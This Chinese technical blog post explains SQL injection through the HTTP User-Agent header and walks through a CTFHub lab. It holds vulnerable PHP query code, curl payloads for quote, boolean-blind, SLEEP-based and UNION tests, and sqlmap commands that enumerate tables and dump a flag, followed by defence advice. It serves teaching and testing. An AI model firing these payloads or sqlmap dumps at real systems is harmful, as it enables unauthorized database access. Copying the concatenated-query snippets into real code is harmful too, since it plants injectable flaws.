---
title: "深入 User-Agent SQL 注入：从日志记录到设备识别的隐藏攻击面"
date: 2026-06-03T22:15:00+08:00
draft: false
tags: ["CTF", "Web安全", "SQL注入", "User-Agent注入", "sqlmap", "HTTP Header注入"]
categories: ["技术笔记"]
---

## 一、什么是 User-Agent SQL 注入

User-Agent（UA）注入是 HTTP Header 注入的一种具体形式。攻击者将 SQL 注入 payload 植入 HTTP 请求的 `User-Agent` 头部，当服务端**将 UA 信息直接拼接到 SQL 语句**中时，即可触发注入。

与 GET/POST 注入不同，UA 注入的触发逻辑往往不在主业务流程中，而是隐藏在**日志记录、统计分析、设备识别**等周边功能里。

### 典型的漏洞代码

```php
// 记录访问日志到数据库
$ua = $_SERVER['HTTP_USER_AGENT'];
$ip = $_SERVER['REMOTE_ADDR'];
$sql = "INSERT INTO access_logs (ip, user_agent, visit_time) 
        VALUES ('$ip', '$ua', NOW())";
mysqli_query($conn, $sql);
```

这段代码本身可能不是核心业务，但因为它直接拼接了 UA，攻击者通过修改 User-Agent 就能控制数据库。

---

## 二、常见应用场景（攻击面分析）

UA 注入往往出现在以下业务场景中：

### 2.1 访问日志与审计系统

许多网站将用户访问记录写入数据库，用于：
- 行为分析、PV/UV 统计
- 安全审计、异常访问检测
- 运维监控、流量分析

如果日志表的结构包含 UA 字段且未做参数化处理，UA 就是直接的注入点。

### 2.2 设备识别与内容适配

部分网站根据 UA 判断设备类型，决定返回 PC 版还是移动端页面：

```php
$ua = $_SERVER['HTTP_USER_AGENT'];
$result = mysqli_query($conn, 
    "SELECT template FROM devices WHERE ua_pattern LIKE '%$ua%'"
);
```

为了「快速匹配设备」，开发者可能把 UA 直接塞进 `LIKE` 查询里。

### 2.3 反爬虫与防 CC 系统

反爬虫系统通常会记录请求的 UA：
- 识别已知爬虫特征（如 `python-requests`、`curl`）
- 统计同一 UA 的请求频率
- 将可疑 UA 加入黑名单

这些记录和查询逻辑如果直接拼接 UA，就会形成注入点。

### 2.4 WAF 与安全设备的后端分析

讽刺的是，有些 WAF 或安全分析平台为了「分析请求特征」，会把 UA、Referer 等头部信息写入数据库做聚合统计。如果写入过程本身存在注入漏洞，安全设备反而成了突破口。

### 2.5 广告与推荐系统

广告投放平台经常根据 UA 中的浏览器、操作系统信息做定向推送：

```sql
SELECT ad_id FROM ads 
WHERE target_browser = '$browser_from_ua' 
  AND target_os = '$os_from_ua'
```

从 UA 中提取的字段如果直接用于查询，同样存在注入风险。

---

## 三、UA 注入 vs Cookie 注入 vs GET 注入

| 维度 | GET 注入 | Cookie 注入 | UA 注入 |
|------|---------|------------|---------|
| **参数位置** | URL `?id=1` | `Cookie: id=1` | `User-Agent: Mozilla/5.0` |
| **业务场景** | 主业务查询 | 偏好/状态持久化 | 日志/统计/设备识别 |
| **开发者警觉性** | 高 | 中 | 很低 |
| **WAF 检测强度** | 强 | 较弱 | 通常很弱 |
| **sqlmap level** | 默认检测 | `--level=2` | `--level=3` |
| **手工修改难度** | 低 | 中 | 中 |

**UA 注入的特殊性**：它不是主业务流程的一部分，往往出现在「辅助功能」中，因此最容易被开发和测试遗漏。

---

## 四、手工验证 UA 注入

### 4.1 用 curl 测试

```bash
# 1. 正常请求（基准）
curl -s "http://target.com/" \
  -H "User-Agent: Mozilla/5.0"

# 2. 单引号测试
curl -s "http://target.com/" \
  -H "User-Agent: Mozilla/5.0'"

# 3. 布尔盲注测试
curl -s "http://target.com/" \
  -H "User-Agent: Mozilla/5.0' AND 1=1-- -"
curl -s "http://target.com/" \
  -H "User-Agent: Mozilla/5.0' AND 1=2-- -"

# 4. 时间盲注测试
curl -s -o /dev/null -w "%{time_total}" \
  "http://target.com/" \
  -H "User-Agent: Mozilla/5.0' AND IF(1=1, SLEEP(5), 0)-- -"

# 5. UNION 测试
curl -s "http://target.com/" \
  -H "User-Agent: -1' UNION SELECT 1,2,3-- -"
```

### 4.2 用浏览器开发者工具

1. F12 打开开发者工具 → Network/网络
2. 刷新页面，右键任意请求 → 编辑并重发
3. 修改 `User-Agent` 头部，观察响应差异

---

## 五、sqlmap 自动化利用

### 5.1 核心参数

| 参数 | 作用 | 是否必须 |
|------|------|---------|
| `--user-agent="xxx"` | 指定自定义 UA | 否（sqlmap 有默认 UA） |
| `--level=3` | UA 注入需要 level >= 3 | **是** |
| `--batch` | 自动回答交互提问 | 强烈推荐 |
| `--random-agent` | 随机轮换 UA（绕过部分 WAF） | 可选 |

**关键点**：sqlmap 默认 `--level=1/2` **不会测试 UA 头部**，必须显式升到 `--level=3` 才会覆盖 User-Agent、Referer 等 Header 注入点。

### 5.2 自动检测所有 Header 注入点

```bash
python sqlmap.py -u "http://target.com/" \
  --level=3 \
  --batch
```

sqlmap 会依次测试：
- GET/POST 参数（level 1）
- Cookie（level 2）
- User-Agent、Referer、Host 等 Header（level 3）

### 5.3 指定 UA 并标记注入位

如果已知 UA 是注入点，可以用 `*` 标记：

```bash
python sqlmap.py -u "http://target.com/" \
  --user-agent="Mozilla/5.0*" \
  --level=3 \
  --batch
```

`*` 告诉 sqlmap「在这个位置尝试注入 payload」。

### 5.4 实战案例（CTFHub UA 注入）

目标：`http://challenge-312d91e10f0dd116.sandbox.ctfhub.com:10800/`

**Step 1：检测注入点**

```bash
python sqlmap.py -u "http://challenge-xxx.sandbox.ctfhub.com:10800/" \
  --level=3 \
  --batch
```

sqlmap 输出：

```
Parameter: User-Agent (User-Agent)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: 1 AND 6313=6313

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: 1 AND (SELECT 1838 FROM (SELECT(SLEEP(5)))CNYS)

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: -4301 UNION ALL SELECT NULL,CONCAT(...)-- -
```

**这个 UA 注入点同时支持三种注入类型**，其中 UNION 注入最快。

**Step 2：枚举表名和列名**

```bash
python sqlmap.py -u "http://challenge-xxx.sandbox.ctfhub.com:10800/" \
  --level=3 \
  --technique=U \
  --batch \
  --tables

python sqlmap.py -u "http://challenge-xxx.sandbox.ctfhub.com:10800/" \
  --level=3 \
  --technique=U \
  --batch \
  -D sqli -T atkntuqarr --columns
```

> CTFHub 的表名和列名是随机生成的（如 `atkntuqarr`、`jiashveuse`），每次重置都会变化，不能硬编码。

**Step 3：Dump flag**

```bash
python sqlmap.py -u "http://challenge-xxx.sandbox.ctfhub.com:10800/" \
  --level=3 \
  --technique=U \
  --batch \
  -D sqli -T atkntuqarr -C jiashveuse --dump
```

结果：

```
+----------------------------------+
| jiashveuse                       |
+----------------------------------+
| ctfhub{3d3a223a6f0ef557899018b5} |
+----------------------------------+
```

因为有 UNION 注入，整个过程在几秒内完成。

---

## 六、Header 注入的扩展

UA 注入只是 HTTP Header 注入的一种。sqlmap 支持检测的 Header 注入点包括：

| 注入位置 | sqlmap 参数 | 所需 level |
|---------|------------|-----------|
| Cookie | `--cookie` | 2 |
| User-Agent | `--user-agent` / 默认检测 | 3 |
| Referer | `--referer` / 默认检测 | 3 |
| Host | 默认检测 | 3 |
| 自定义 Header | `-H "X-Custom: 1"` | 3 |

**推荐做法**：渗透测试时直接用 `--level=3 --batch` 跑一遍，让 sqlmap 自动扫描所有可能的注入点，不要只盯着 URL 参数。

---

## 七、防御建议

### 7.1 参数化查询（根本解决）

```php
// 错误
$ua = $_SERVER['HTTP_USER_AGENT'];
$sql = "INSERT INTO logs (ua) VALUES ('$ua')";

// 正确
$stmt = $conn->prepare("INSERT INTO logs (ua) VALUES (?)");
$stmt->bind_param("s", $_SERVER['HTTP_USER_AGENT']);
$stmt->execute();
```

### 7.2 日志脱敏与截断

即使做参数化查询，也建议对 UA 做预处理：
- 截断过长内容（UA 通常不超过 512 字符）
- 过滤或编码特殊字符
- 不需要完整 UA 时只提取关键特征（浏览器、OS）

### 7.3 安全测试覆盖

安全测试和代码审计时，除了检查主业务逻辑，还应重点关注：
- 所有将 HTTP Header 写入数据库的代码
- 日志、统计、审计模块
- 第三方安全/WAF 产品的数据持久化逻辑

---

## 八、总结

User-Agent SQL 注入是一种**隐蔽但真实存在的攻击向量**。它的危险不在于技术难度，而在于**容易被忽视**——开发者往往不会想到「记录个浏览器信息」也能导致数据库被攻破。

关键记忆点：

1. **sqlmap 测 UA 注入必须 `--level=3`**，默认 level 不覆盖 Header
2. **常见攻击面**：日志系统、设备识别、反爬虫、WAF 后端分析
3. **UA 注入和 Cookie 注入可以共存**，同一个请求可能有多个注入点
4. **优先利用 UNION 注入**，盲注速度不可接受
5. **安全测试要覆盖「辅助功能」**，不要只盯着主业务逻辑

理解 UA 注入的存在形式和检测方法，能够帮你发现那些藏在「日志表」里的漏洞。
